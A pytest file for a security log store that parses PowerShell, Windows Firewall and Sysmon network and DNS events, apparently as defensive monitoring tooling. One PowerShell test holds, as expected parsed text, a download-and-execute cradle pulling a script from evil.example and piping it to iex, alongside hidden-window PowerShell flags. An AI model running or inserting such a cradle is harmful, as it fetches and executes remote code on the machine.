"""Log store and source parsers (webui/log_store.py).

No wall clock, no local time zone and no VM: the readers are fakes, the firewall
offset is injected and every time is fixed.
"""

import json
import os
import threading
from datetime import datetime, timezone

import pytest

import log_store as ls

SAMPLES = os.path.join(os.path.dirname(__file__), "samples", "logs")
NOW = datetime(2026, 11, 14, 12, 0, 0, tzinfo=timezone.utc)


def sample(name):
    with open(os.path.join(SAMPLES, name), encoding="utf-8") as f:
        return f.read()


# ---- store -------------------------------------------------------------------------------


def test_add_assigns_monotonic_ids_and_counts():
    s = ls.LogStore()
    a = s.add("access", "2026-11-14T10:00:00Z", "GET /x", {"status": 200})
    b = s.add("dns", "2026-11-14T10:00:01Z", "evil.example", {})
    c = s.add("access", "2026-11-14T10:00:02Z", "GET /y", {})
    assert [a["id"], b["id"], c["id"]] == ["access-1", "dns-2", "access-3"]
    assert a["source"] == "access" and a["fields"] == {"status": 200}
    assert s.counts() == {"powershell": 0, "access": 2, "mcp": 0, "netflow": 0, "dns": 1, "firewall": 0}
    assert s.last_time("access") == "2026-11-14T10:00:02Z"
    assert s.last_time("mcp") is None


def test_unknown_source_is_rejected():
    with pytest.raises(ValueError):
        ls.LogStore().add("syslog", "2026-11-14T10:00:00Z", "x", {})


def test_last_time_is_the_latest_not_the_last_added():
    s = ls.LogStore()
    s.add("dns", "2026-11-14T10:00:05Z", "a", {})
    s.add("dns", "2026-11-14T10:00:01Z", "b", {})
    s.add("dns", "2026-11-14T10:00:05.500Z", "c", {})
    assert s.last_time("dns") == "2026-11-14T10:00:05.500Z"


def test_ring_buffer_drops_the_oldest_event_across_sources():
    s = ls.LogStore(max_events=3)
    s.add("access", "2026-11-14T10:00:01Z", "a1", {})
    s.add("dns", "2026-11-14T10:00:02Z", "d1", {})
    s.add("access", "2026-11-14T10:00:03Z", "a2", {})
    s.add("mcp", "2026-11-14T10:00:04Z", "m1", {})
    assert [e["message"] for e in s.snapshot()] == ["d1", "a2", "m1"]
    assert s.counts()["access"] == 1 and s.counts()["dns"] == 1 and s.counts()["mcp"] == 1
    s.add("mcp", "2026-11-14T10:00:05Z", "m2", {})
    assert s.counts()["dns"] == 0 and s.last_time("dns") is None


def test_snapshot_is_a_copy():
    s = ls.LogStore()
    s.add("access", "2026-11-14T10:00:00Z", "a", {})
    snap = s.snapshot()
    snap.clear()
    s.add("access", "2026-11-14T10:00:01Z", "b", {})
    assert len(snap) == 0 and len(s.snapshot()) == 2


def test_extend_and_sources_status():
    s = ls.LogStore()
    s.extend([{"source": "dns", "time": "2026-11-14T10:00:00Z", "message": "m", "fields": {"query": "q"}}])
    s.set_status("firewall", "unavailable", "Firewall logging is off")
    rows = {r["source"]: r for r in s.sources()}
    assert list(rows) == list(ls.SOURCES)
    assert rows["dns"] == {"source": "dns", "count": 1, "last_time": "2026-11-14T10:00:00Z",
                           "status": "ok", "hint": ""}
    assert rows["firewall"]["status"] == "unavailable" and rows["firewall"]["hint"] == "Firewall logging is off"


def test_replace_netflows_only_touches_netflow():
    s = ls.LogStore()
    s.add("dns", "2026-11-14T10:00:00Z", "d", {})
    s.add("netflow", "2026-11-14T10:00:00Z", "old", {})
    s.replace_netflows([{"time": "2026-11-14T10:01:00Z", "message": "new", "fields": {"count": 2}}])
    assert [(e["source"], e["message"]) for e in s.snapshot()] == [("dns", "d"), ("netflow", "new")]
    assert s.counts()["netflow"] == 1 and s.last_time("netflow") == "2026-11-14T10:01:00Z"


def test_store_is_thread_safe():
    s = ls.LogStore(max_events=500)

    def work(n):
        for i in range(300):
            s.add("access", "2026-11-14T10:00:00Z", f"{n}-{i}", {})
            s.snapshot()

    threads = [threading.Thread(target=work, args=(n,)) for n in range(6)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert s.counts()["access"] == 500
    ids = [int(e["id"].split("-")[1]) for e in s.snapshot()]
    assert ids == sorted(ids) and len(set(ids)) == 500


# ---- persistence -------------------------------------------------------------------------


def test_only_access_and_mcp_are_persisted(tmp_path):
    s = ls.LogStore(persist_dir=str(tmp_path))
    s.add("access", "2026-11-14T10:00:00Z", "GET /x", {"status": 200})
    s.add("mcp", "2026-11-14T10:00:01Z", "scan", {"tool": "tdc_scan"})
    s.add("dns", "2026-11-14T10:00:02Z", "q", {})
    assert sorted(os.listdir(tmp_path)) == ["access.jsonl", "mcp.jsonl"]
    line = json.loads((tmp_path / "access.jsonl").read_text(encoding="utf-8"))
    assert line["message"] == "GET /x" and line["fields"] == {"status": 200}


def test_persisted_events_load_in_time_order_and_skip_broken_lines(tmp_path):
    (tmp_path / "access.jsonl.1").write_text(
        json.dumps({"time": "2026-11-14T09:00:00Z", "source": "access", "message": "old", "fields": {}}) + "\n",
        encoding="utf-8")
    (tmp_path / "access.jsonl").write_text(
        json.dumps({"time": "2026-11-14T10:00:00Z", "source": "access", "message": "new", "fields": {"a": 1}}) + "\n"
        + "{not json\n"
        + json.dumps(["not", "a", "dict"]) + "\n"
        + json.dumps({"time": 5, "message": "no time"}) + "\n"
        + "\n", encoding="utf-8")
    before = (tmp_path / "access.jsonl").read_text(encoding="utf-8")
    s = ls.LogStore(persist_dir=str(tmp_path))
    assert s.load_persisted() == 2
    assert (tmp_path / "access.jsonl").read_text(encoding="utf-8") == before     # loading writes nothing
    snap = s.snapshot()
    assert [e["message"] for e in snap] == ["old", "new"]
    assert snap[1]["fields"] == {"a": 1} and snap[1]["id"].startswith("access-")
    s.add("access", "2026-11-14T11:00:00Z", "later", {})
    assert (tmp_path / "access.jsonl").read_text(encoding="utf-8").endswith('"message": "later", "fields": {}}\n')


def test_persisted_file_rotates_at_10_mb_and_keeps_one_old_file(tmp_path, monkeypatch):
    monkeypatch.setattr(ls, "ROTATE_BYTES", 600)
    s = ls.LogStore(persist_dir=str(tmp_path))
    for i in range(40):
        s.add("access", f"2026-11-14T10:00:{i:02d}Z", f"GET /{i:04d}" + "x" * 40, {"i": i})
    names = sorted(os.listdir(tmp_path))
    assert names == ["access.jsonl", "access.jsonl.1"]
    assert (tmp_path / "access.jsonl").stat().st_size <= 600
    s2 = ls.LogStore(persist_dir=str(tmp_path))
    n = s2.load_persisted()
    msgs = [e["message"] for e in s2.snapshot()]
    assert 0 < n < 40 and msgs == sorted(msgs) and msgs[-1].startswith("GET /0039")


def test_rotation_limit_is_10_mb():
    assert ls.ROTATE_BYTES == 10 * 1024 * 1024


def test_persist_failure_does_not_break_add(tmp_path):
    blocker = tmp_path / "file"
    blocker.write_text("x")
    s = ls.LogStore(persist_dir=str(blocker / "sub"))
    assert s.add("access", "2026-11-14T10:00:00Z", "a", {})["id"] == "access-1"


# ---- PowerShell --------------------------------------------------------------------------


def test_script_block_in_three_unordered_parts_is_one_event():
    events = ls.parse_powershell_events(sample("ps_scriptblock_3parts.xml"))
    assert len(events) == 1
    e = events[0]
    assert e["source"] == "powershell"
    script = '$u = "http://evil.example/a.ps1"; $c = New-Object Net.WebClient; $c.DownloadString($u) | iex'
    assert e["message"] == script and e["fields"]["script"] == script
    assert e["time"] == "2026-11-14T10:00:00.123Z"
    f = e["fields"]
    assert f["event_id"] == 4104 and f["record_id"] == 101 and f["pid"] == 4242 and f["user_sid"] == "S-1-5-18"
    assert f["script_block_id"] == "{11111111-2222-3333-4444-555555555555}"
    assert f["message_number"] == 1 and f["message_total"] == 3 and f["path"] == ""
    assert "partial" not in f


def test_script_block_with_a_missing_part_is_partial():
    events = ls.parse_powershell_events(sample("ps_scriptblock_partial.xml"))
    assert len(events) == 1
    assert events[0]["fields"]["partial"] is True
    assert events[0]["message"] == "part one part three"
    assert events[0]["fields"]["message_total"] == 3


def test_4103_payload_context_host_application_and_command():
    events = ls.parse_powershell_events(sample("ps_misc.xml"))
    e = next(x for x in events if x["fields"]["event_id"] == 4103)
    f = e["fields"]
    assert "value=\"http://evil.example/a.ps1\"" in f["payload"]
    assert f["context"].lstrip().startswith("Severity = Informational")
    assert f["host_application"].endswith("powershell.exe -nop -w hidden")
    assert f["command"] == "Invoke-WebRequest"
    assert f["record_id"] == 201 and e["message"].startswith("CommandInvocation(Invoke-WebRequest)")


def test_4100_error_text():
    e = next(x for x in ls.parse_powershell_events(sample("ps_misc.xml")) if x["fields"]["event_id"] == 4100)
    assert "Cannot find path" in e["fields"]["error"] and e["message"].startswith("Error Message")


def test_broken_event_is_skipped_and_the_rest_is_kept():
    events = ls.parse_powershell_events(sample("ps_misc.xml"))
    assert [e["fields"]["event_id"] for e in events] == [4103, 4100, 4104]
    assert [e["time"] for e in events] == sorted(e["time"] for e in events)


def test_script_text_stays_raw_html_and_ansi():
    e = ls.parse_powershell_events(sample("ps_misc.xml"))[-1]
    assert e["message"] == 'Write-Host "<script>alert(1)</script>" \x1b[31mred\x1b[0m'
    assert e["fields"]["script"] == e["message"] and e["fields"]["path"] == "C:\\tools\\x.ps1"


def test_raw_escape_character_in_xml_text_survives():
    xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4104</EventID>'
           '<TimeCreated SystemTime="2026-11-14T10:00:00.0000000Z"/><EventRecordID>1</EventRecordID></System>'
           '<EventData><Data Name="MessageNumber">1</Data><Data Name="MessageTotal">1</Data>'
           '<Data Name="ScriptBlockText">a\x1b[1mb</Data><Data Name="ScriptBlockId">{x}</Data></EventData></Event>')
    assert ls.parse_powershell_events(xml)[0]["message"] == "a\x1b[1mb"


def test_empty_or_garbage_input_gives_no_events():
    assert ls.parse_powershell_events("") == []
    assert ls.parse_powershell_events("no xml at all") == []


# ---- firewall ----------------------------------------------------------------------------


def test_firewall_log_with_header_comments_and_a_broken_line():
    events = ls.parse_firewall_log(sample("firewall.log"), utc_offset_s=3600)
    assert [e["message"] for e in events] == [
        "ALLOW TCP 10.0.2.15:52311 -> 142.250.185.78:443",
        "DROP UDP 192.168.64.1:5353 -> 10.0.2.15:5353",
        "ALLOW ICMP 10.0.2.15 -> 8.8.8.8",
    ]
    first = events[0]
    assert first["source"] == "firewall"
    assert first["time"] == "2026-11-14T09:00:01Z"      # 10:00:01 local at UTC+1
    assert first["fields"] == {"action": "ALLOW", "protocol": "TCP", "src_ip": "10.0.2.15",
                               "dst_ip": "142.250.185.78", "src_port": 52311, "dst_port": 443, "size": 0,
                               "path": "SEND", "direction": "SEND", "pid": 4242}
    assert events[1]["fields"]["direction"] == "RECEIVE" and events[1]["fields"]["pid"] == 0
    assert "src_port" not in events[2]["fields"] and events[2]["fields"]["size"] == 60


def test_firewall_offset_is_applied_in_both_directions():
    line = "2026-11-14 01:30:00 ALLOW TCP 1.1.1.1 2.2.2.2 1 2 0 - - - - - - - SEND 7\n"
    assert ls.parse_firewall_log(line, utc_offset_s=-5 * 3600)[0]["time"] == "2026-11-14T06:30:00Z"
    assert ls.parse_firewall_log(line, utc_offset_s=3 * 3600)[0]["time"] == "2026-11-13T22:30:00Z"


def test_firewall_follows_the_fields_header_and_tolerates_a_missing_pid():
    text = ("#Fields: date time action protocol src-ip dst-ip src-port dst-port size path\n"
            "2026-11-14 10:00:01 ALLOW TCP 10.0.0.5 1.2.3.4 52311 443 0 SEND\n")
    e = ls.parse_firewall_log(text, utc_offset_s=0)[0]
    assert e["message"] == "ALLOW TCP 10.0.0.5:52311 -> 1.2.3.4:443" and "pid" not in e["fields"]
    assert e["fields"]["direction"] == "SEND"


def test_firewall_incremental_text_uses_the_given_columns():
    cols = ["date", "time", "action", "protocol", "src-ip", "dst-ip", "src-port", "dst-port", "size", "path"]
    text = "2026-11-14 10:00:01 DROP UDP 10.0.0.5 1.2.3.4 5000 53 0 SEND\n"
    assert ls.parse_firewall_log(text, 0, fields=cols)[0]["fields"]["dst_port"] == 53
    assert ls.firewall_fields("#Version: 1.5\n#Fields: date time action\n") == ["date", "time", "action"]
    assert ls.firewall_fields("nothing") is None


# ---- Sysmon ------------------------------------------------------------------------------


def conn(ts, image="C:\\x\\a.exe", pid="4242", dst="1.2.3.4", port="443", host="evil.example", proto="tcp",
         src="10.0.2.15"):
    ev = {"timestamp": ts, "event_id": 3, "pid": pid, "image": image, "user": "WIN11\\analyst",
          "type": "NetworkConnect", "dst_ip": dst, "dst_port": port, "dst_hostname": host, "protocol": proto}
    if src:
        ev["src_ip"] = src
    return ev


def test_netflows_are_bundled_and_counted():
    events = [
        conn("2026-11-14T11:00:01.100000+01:00"),
        conn("2026-11-14T11:00:05.200000+01:00"),
        conn("2026-11-14T11:00:03.000000+01:00"),
        conn("2026-11-14T11:00:04+01:00", port="80", host=""),
        conn("2026-11-14T11:00:04+01:00", pid="999"),
        {"timestamp": "2026-11-14T11:00:00+01:00", "event_id": 1, "image": "x"},
        {"error": "Sysmon not found"},
    ]
    flows = ls.netflows_from_sysmon(events)
    assert len(flows) == 3
    big = next(f for f in flows if f["fields"]["count"] == 3)
    assert big["source"] == "netflow"
    assert big["fields"] == {"image": "C:\\x\\a.exe", "pid": 4242, "protocol": "tcp", "src_ip": "10.0.2.15",
                             "dst_ip": "1.2.3.4", "dst_port": 443, "dst_hostname": "evil.example", "count": 3,
                             "first_seen": "2026-11-14T10:00:01Z", "last_seen": "2026-11-14T10:00:05Z"}
    assert big["time"] == "2026-11-14T10:00:05Z"
    assert big["message"] == "C:\\x\\a.exe \u2192 evil.example:443 (3\u00d7)"
    nohost = next(f for f in flows if f["fields"]["dst_port"] == 80)
    assert nohost["message"] == "C:\\x\\a.exe \u2192 1.2.3.4:80 (1\u00d7)"
    assert [f["time"] for f in flows] == sorted(f["time"] for f in flows)


def test_netflow_key_ignores_source_port_but_not_src_ip():
    a = conn("2026-11-14T11:00:01+01:00")
    b = dict(conn("2026-11-14T11:00:02+01:00"), src_port="50000")
    c = conn("2026-11-14T11:00:03+01:00", src="192.168.0.9")
    flows = ls.netflows_from_sysmon([a, b, c])
    assert sorted(f["fields"]["count"] for f in flows) == [1, 2]


def test_dns_events_from_sysmon():
    events = [
        {"timestamp": "2026-11-14T11:00:02+01:00", "event_id": 22, "pid": "4242", "image": "C:\\x\\a.exe",
         "type": "DNSQuery", "query": "evil.example", "result": "type: 5 c.evil.example;1.2.3.4;"},
        {"timestamp": "2026-11-14T11:00:01+01:00", "event_id": 22, "pid": "7", "image": "C:\\y.exe",
         "query": "nx.example", "result": "", "status": "NXDOMAIN"},
        conn("2026-11-14T11:00:00+01:00"),
    ]
    dns = ls.dns_from_sysmon(events)
    assert [d["fields"]["query"] for d in dns] == ["nx.example", "evil.example"]
    assert dns[1]["time"] == "2026-11-14T10:00:02Z" and dns[1]["source"] == "dns"
    assert dns[1]["fields"] == {"query": "evil.example", "result": "type: 5 c.evil.example;1.2.3.4;",
                                "image": "C:\\x\\a.exe", "pid": 4242, "status": None}
    assert dns[0]["fields"]["status"] == "NXDOMAIN" and dns[0]["message"] == "nx.example"
    assert dns[1]["message"] == "evil.example -> type: 5 c.evil.example;1.2.3.4;"


# ---- collector ---------------------------------------------------------------------------


class Readers:
    def __init__(self):
        self.ps_calls, self.sysmon_calls, self.fw_calls = [], [], []
        self.ps_xml = sample("ps_misc.xml")
        self.sysmon = []
        self.fw_text = sample("firewall.log")
        self.fw_hint = ""
        self.fail = set()

    def powershell(self, since):
        self.ps_calls.append(since)
        if "ps" in self.fail:
            raise OSError("wevtutil: access denied\nsecond line")
        xml, self.ps_xml = self.ps_xml, ""
        return xml, 203

    def sysmon_read(self, ids, since):
        self.sysmon_calls.append((tuple(ids), since))
        if "sysmon" in self.fail:
            raise RuntimeError("Sysmon is not installed")
        return list(self.sysmon)

    def firewall(self, offset):
        self.fw_calls.append(offset)
        if "fw" in self.fail:
            raise PermissionError("pfirewall.log: denied")
        text, self.fw_text = self.fw_text, ""
        return text, 999, self.fw_hint


def make_collector(readers, store=None, now=NOW):
    store = store or ls.LogStore()
    return store, ls.Collector(store, readers.powershell, readers.sysmon_read, readers.firewall,
                               lambda: now, utc_offset_s=3600)


def test_collector_reads_every_source_incrementally():
    r = Readers()
    r.sysmon = [conn("2026-11-14T11:00:01+01:00"), conn("2026-11-14T11:00:02+01:00"),
                {"timestamp": "2026-11-14T11:00:03+01:00", "event_id": 22, "pid": "4242", "image": "a.exe",
                 "query": "evil.example", "result": "1.2.3.4"}]
    store, c = make_collector(r)
    added = c.tick()
    assert added == {"powershell": 3, "netflow": 1, "dns": 1, "firewall": 3}
    assert r.ps_calls == [None] and r.fw_calls == [None]
    assert r.sysmon_calls[0][0] == (3, 22) and r.sysmon_calls[0][1] == "2026-11-13T12:00:00Z"
    counts = store.counts()
    assert counts["powershell"] == 3 and counts["netflow"] == 1 and counts["dns"] == 1 and counts["firewall"] == 3
    assert all(s["status"] == "ok" for s in store.sources())
    c.tick()
    assert r.ps_calls == [None, 203] and r.fw_calls == [None, 999]
    assert store.counts() == counts


def test_netflow_window_is_rebundled_not_double_counted():
    r = Readers()
    r.sysmon = [conn("2026-11-14T11:00:01+01:00"), conn("2026-11-14T11:00:02+01:00")]
    store, c = make_collector(r)
    c.tick()
    # the reader returns the overlap again plus one new connection
    r.sysmon = [conn("2026-11-14T11:00:02+01:00"), conn("2026-11-14T11:00:09+01:00")]
    c.tick()
    flows = [e for e in store.snapshot() if e["source"] == "netflow"]
    assert len(flows) == 1 and flows[0]["fields"]["count"] == 3
    assert flows[0]["fields"]["last_seen"] == "2026-11-14T10:00:09Z"
    assert r.sysmon_calls[1][1] == "2026-11-14T09:59:57Z"      # newest event of the first read minus the overlap


def test_dns_events_are_not_added_twice():
    r = Readers()
    q = {"timestamp": "2026-11-14T11:00:03+01:00", "event_id": 22, "pid": "1", "image": "a.exe",
         "query": "evil.example", "result": "1.2.3.4"}
    r.sysmon = [q]
    store, c = make_collector(r)
    c.tick()
    c.tick()
    assert store.counts()["dns"] == 1


def test_start_read_is_limited_to_24_hours():
    r = Readers()
    r.ps_xml = ""
    r.fw_text = ("2026-11-12 10:00:00 ALLOW TCP 1.1.1.1 2.2.2.2 1 2 0 - - - - - - - SEND 7\n"
                 "2026-11-14 10:00:00 ALLOW TCP 1.1.1.1 2.2.2.2 1 2 0 - - - - - - - SEND 7\n")
    r.sysmon = [conn("2026-11-12T11:00:00+01:00"), conn("2026-11-14T11:00:00+01:00", port="80")]
    store, c = make_collector(r)
    c.tick()
    assert store.counts()["firewall"] == 1
    assert [f["fields"]["dst_port"] for f in store.snapshot() if f["source"] == "netflow"] == [80]


def test_start_read_keeps_at_most_5000_per_source(monkeypatch):
    monkeypatch.setattr(ls, "START_LIMIT", 4)
    r = Readers()
    r.ps_xml = ""
    r.fw_text = "".join(f"2026-11-14 10:00:{i:02d} ALLOW TCP 1.1.1.1 2.2.2.2 1 2 0 - - - - - - - SEND 7\n"
                        for i in range(10))
    store, c = make_collector(r)
    c.tick()
    fw = [e for e in store.snapshot() if e["source"] == "firewall"]
    assert [e["time"][-3:-1] for e in fw] == ["06", "07", "08", "09"]
    assert ls.START_WINDOW_S == 24 * 3600


def test_collector_remembers_the_firewall_header_for_the_next_read():
    r = Readers()
    r.ps_xml = ""
    r.fw_text = ("#Fields: date time action protocol src-ip dst-ip src-port dst-port size path\n"
                 "2026-11-14 10:00:01 ALLOW TCP 10.0.0.5 1.2.3.4 52311 443 0 SEND\n")
    store, c = make_collector(r)
    c.tick()
    r.fw_text = "2026-11-14 10:00:02 DROP UDP 10.0.0.5 1.2.3.4 5000 53 0 RECEIVE\n"
    c.tick()
    fw = [e for e in store.snapshot() if e["source"] == "firewall"]
    assert [e["fields"]["dst_port"] for e in fw] == [443, 53]


@pytest.mark.parametrize("broken,unavailable,still_ok", [
    ("ps", ["powershell"], ["netflow", "dns", "firewall"]),
    ("sysmon", ["netflow", "dns"], ["powershell", "firewall"]),
    ("fw", ["firewall"], ["powershell", "netflow", "dns"]),
])
def test_a_throwing_reader_marks_only_its_sources_unavailable(broken, unavailable, still_ok):
    r = Readers()
    r.fail = {broken}
    store, c = make_collector(r)
    r.sysmon = [conn("2026-11-14T11:00:01+01:00")]
    c.tick()
    rows = {s["source"]: s for s in store.sources()}
    for name in unavailable:
        assert rows[name]["status"] == "unavailable" and rows[name]["hint"]
        assert "\n" not in rows[name]["hint"]
    for name in still_ok:
        assert rows[name]["status"] == "ok"
    if broken == "ps":
        assert rows["powershell"]["hint"] == "wevtutil: access denied"
        assert store.counts()["firewall"] == 3 and store.counts()["netflow"] == 1
    if broken == "fw":
        assert store.counts()["powershell"] == 3


def test_a_source_recovers_after_an_error():
    r = Readers()
    r.fail = {"ps"}
    store, c = make_collector(r)
    c.tick()
    assert {s["source"]: s["status"] for s in store.sources()}["powershell"] == "unavailable"
    r.fail = set()
    r.ps_xml = sample("ps_misc.xml")
    c.tick()
    assert {s["source"]: s["status"] for s in store.sources()}["powershell"] == "ok"
    assert store.counts()["powershell"] == 3


def test_sysmon_error_entry_marks_sysmon_sources_unavailable():
    r = Readers()
    r.sysmon = [{"error": "Sysmon event query timed out"}]
    store, c = make_collector(r)
    c.tick()
    rows = {s["source"]: s for s in store.sources()}
    assert rows["netflow"]["status"] == "unavailable" and rows["dns"]["hint"] == "Sysmon event query timed out"
    assert rows["powershell"]["status"] == "ok"


def test_firewall_hint_without_data_is_unavailable():
    r = Readers()
    r.fw_text = ""
    r.fw_hint = "Windows Firewall logging is off"
    store, c = make_collector(r)
    c.tick()
    row = {s["source"]: s for s in store.sources()}["firewall"]
    assert row["status"] == "unavailable" and row["hint"] == "Windows Firewall logging is off"


# ---- review fixes ------------------------------------------------------------------------


def test_lone_surrogate_in_an_event_does_not_break_add_and_survives_the_file(tmp_path):
    s = ls.LogStore(persist_dir=str(tmp_path))
    e = s.add("mcp", "2026-11-14T10:00:00Z", "tool x\ud800y", {"arg": "\ud800"})
    assert e["id"] == "mcp-1" and s.counts()["mcp"] == 1
    s2 = ls.LogStore(persist_dir=str(tmp_path))
    assert s2.load_persisted() == 1
    assert s2.snapshot()[0]["fields"] == {"arg": "\ud800"}


def test_any_persist_error_is_swallowed_once(tmp_path, caplog):
    class Bad:
        def __str__(self):
            raise RuntimeError("no text")

    s = ls.LogStore(persist_dir=str(tmp_path))
    assert s.add("access", "2026-11-14T10:00:00Z", "a", {"o": Bad()})["id"] == "access-1"
    assert s.add("access", "2026-11-14T10:00:01Z", "b", {"o": Bad()})["id"] == "access-2"
    assert len([r for r in caplog.records if "persistence failed" in r.getMessage()]) == 1


def test_store_has_a_character_budget_that_evicts_whole_oldest_events():
    assert ls.MAX_CHARS == 200_000_000
    s = ls.LogStore(max_events=100, max_chars=100)
    s.add("access", "2026-11-14T10:00:01Z", "a" * 40, {})
    s.add("dns", "2026-11-14T10:00:02Z", "b" * 30, {"query": "q" * 10})
    assert s.counts()["access"] == 1
    s.add("mcp", "2026-11-14T10:00:03Z", "c" * 40, {})
    assert [e["source"] for e in s.snapshot()] == ["dns", "mcp"]
    assert s.counts()["access"] == 0 and s.last_time("access") is None
    assert s.snapshot()[1]["message"] == "c" * 40          # never shortened


def test_an_event_over_the_budget_alone_is_kept_whole():
    s = ls.LogStore(max_chars=10)
    s.add("access", "2026-11-14T10:00:01Z", "old", {})
    s.add("access", "2026-11-14T10:00:02Z", "x" * 50, {})
    assert [e["message"] for e in s.snapshot()] == ["x" * 50]


def test_budget_counts_string_fields_and_replaced_netflows():
    s = ls.LogStore(max_chars=60)
    s.add("access", "2026-11-14T10:00:01Z", "m", {"path": "p" * 50})
    s.replace_netflows([{"time": "2026-11-14T10:00:02Z", "message": "n" * 30, "fields": {"image": "i" * 20}}])
    assert [e["source"] for e in s.snapshot()] == ["netflow"]


def test_a_failing_chunk_is_skipped_and_counted(monkeypatch):
    real = ls._xml_event

    def flaky(chunk):
        if "<EventID>4100</EventID>" in chunk:
            raise RuntimeError("boom")
        return real(chunk)

    monkeypatch.setattr(ls, "_xml_event", flaky)
    stats = {}
    events = ls.parse_powershell_events(sample("ps_misc.xml"), stats)
    assert [e["fields"]["event_id"] for e in events] == [4103, 4104]
    assert stats == {"skipped": 2}          # the broken XML and the failing chunk


def test_powershell_position_advances_past_skipped_events(monkeypatch):
    real = ls._xml_event
    monkeypatch.setattr(ls, "_xml_event", lambda c: (_ for _ in ()).throw(RuntimeError("x"))
                        if "<EventID>4100<" in c else real(c))
    r = Readers()
    store, c = make_collector(r)
    c.tick()
    row = {s["source"]: s for s in store.sources()}["powershell"]
    assert row["status"] == "ok" and row["hint"] == "2 events could not be parsed"
    c.tick()
    assert r.ps_calls == [None, 203]
    assert {s["source"]: s for s in store.sources()}["powershell"]["hint"] == ""


@pytest.mark.parametrize("frac,expected", [("", 0.0), (".1", 0.1), (".123", 0.123), (".1234567", 0.123456)])
def test_fractions_of_any_length_parse(frac, expected):
    base = ls._sysmon_epoch("2026-11-14T10:00:00Z")
    assert ls._sysmon_epoch(f"2026-11-14T10:00:00{frac}Z") == pytest.approx(base + expected, abs=1e-6)
    assert ls._sysmon_epoch(f"2026-11-14T11:00:00{frac}+01:00") == pytest.approx(base + expected, abs=1e-6)
    xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4100</EventID>'
           f'<TimeCreated SystemTime="2026-11-14T10:00:00{frac}Z"/></System><EventData>'
           '<Data Name="Payload">err</Data></EventData></Event>')
    assert len(ls.parse_powershell_events(xml)) == 1


def flow(ts, port=443, count=1, host="h"):
    fields = {"image": "a.exe", "pid": 1, "protocol": "tcp", "src_ip": "10.0.0.1", "dst_ip": "1.2.3.4",
              "dst_port": port, "dst_hostname": host, "count": count}
    return {"time": ts, "source": "netflow", "message": f"a.exe -> {port}", "fields": fields}


def test_a_flow_keeps_its_id_across_replacements():
    s = ls.LogStore()
    s.add("dns", "2026-11-14T10:00:00Z", "d", {})
    first = s.replace_netflows([flow("2026-11-14T10:00:01Z", 443), flow("2026-11-14T10:00:02Z", 80)])
    ids = {e["fields"]["dst_port"]: e["id"] for e in first}
    second = s.replace_netflows([flow("2026-11-14T10:00:09Z", 80, count=2), flow("2026-11-14T10:00:03Z", 443, 5),
                                 flow("2026-11-14T10:00:10Z", 22)])
    again = {e["fields"]["dst_port"]: e["id"] for e in second}
    assert again[443] == ids[443] and again[80] == ids[80]
    assert again[22] not in ids.values()
    assert len({e["id"] for e in s.snapshot()}) == len(s.snapshot()) == 4
    assert [e["fields"]["dst_port"] for e in s.snapshot() if e["source"] == "netflow"] == [443, 80, 22]
    third = s.replace_netflows([flow("2026-11-14T10:00:20Z", 22)])
    assert third[0]["id"] == again[22]
    fourth = s.replace_netflows([flow("2026-11-14T10:00:21Z", 443)])
    assert fourth[0]["id"] != ids[443]                       # a flow that was gone gets a new id


def test_collector_netflow_ids_are_stable_between_ticks():
    r = Readers()
    r.sysmon = [conn("2026-11-14T11:00:01+01:00")]
    store, c = make_collector(r)
    c.tick()
    before = [e["id"] for e in store.snapshot() if e["source"] == "netflow"]
    r.sysmon = [conn("2026-11-14T11:00:09+01:00")]
    c.tick()
    assert [e["id"] for e in store.snapshot() if e["source"] == "netflow"] == before


@pytest.mark.parametrize("stamp", ["0001-01-01 00:00:00", "9999-12-31 23:59:59"])
@pytest.mark.parametrize("offset", [None, -14 * 3600, 14 * 3600])
def test_out_of_range_firewall_dates_are_skipped(stamp, offset):
    text = (f"{stamp} ALLOW TCP 1.1.1.1 2.2.2.2 1 2 0 - - - - - - - SEND 7\n"
            "2026-11-14 10:00:00 ALLOW TCP 1.1.1.1 2.2.2.2 1 2 0 - - - - - - - SEND 7\n")
    events = ls.parse_firewall_log(text, utc_offset_s=offset)
    assert [e["time"][:4] for e in events if e["time"].startswith("2026")] == ["2026"]


def test_out_of_range_sysmon_time_is_skipped():
    for stamp in ("0001-01-01T00:00:00", "9999-12-31T23:59:59", "0001-01-01T00:00:00+14:00"):
        assert ls._sysmon_epoch(stamp) is None or isinstance(ls._sysmon_epoch(stamp), float)


def test_firewall_incomplete_last_line_is_left_for_the_next_read():
    complete = "2026-11-14 10:00:01 ALLOW TCP 10.0.0.5 1.2.3.4 52311 443 0 - - - - - - - SEND 7\n"
    rest = "2026-11-14 10:00:02 DROP UDP 10.0.0.5 1.2.3.4 5000 53 0 - - - - - - - SEND 7\n"
    cut = len(rest) - 9
    calls = []

    def fw(offset):
        calls.append(offset)
        if offset is None:
            return complete + rest[:cut], 5000, ""
        assert offset == 5000 - cut
        return rest, offset + len(rest), ""

    r = Readers()
    r.ps_xml = ""
    store = ls.LogStore()
    c = ls.Collector(store, r.powershell, r.sysmon_read, fw, lambda: NOW, utc_offset_s=0)
    c.tick()
    assert store.counts()["firewall"] == 1
    c.tick()
    assert calls == [None, 5000 - cut]
    assert [e["fields"]["dst_port"] for e in store.snapshot() if e["source"] == "firewall"] == [443, 53]
    c.tick()
    assert store.counts()["firewall"] == 2


def test_firewall_text_without_any_newline_is_not_consumed():
    calls = []

    def fw(offset):
        calls.append(offset)
        return "2026-11-14 10:00:01 ALLOW TCP 10.0", (offset or 0) + 34, ""

    r = Readers()
    store = ls.LogStore()
    c = ls.Collector(store, r.powershell, r.sysmon_read, fw, lambda: NOW, utc_offset_s=0)
    c.tick()
    c.tick()
    assert calls == [None, 0]


def test_dns_seen_cache_is_capped(monkeypatch):
    monkeypatch.setattr(ls, "DNS_SEEN_LIMIT", 3)
    r = Readers()
    r.sysmon = [{"timestamp": f"2026-11-14T11:00:{i:02d}+01:00", "event_id": 22, "pid": "1", "image": "a.exe",
                 "query": f"q{i}.example", "result": "1.2.3.4"} for i in range(10)]
    store, c = make_collector(r)
    c.tick()
    assert len(c._dns_seen) == 3
    assert store.counts()["dns"] == 10
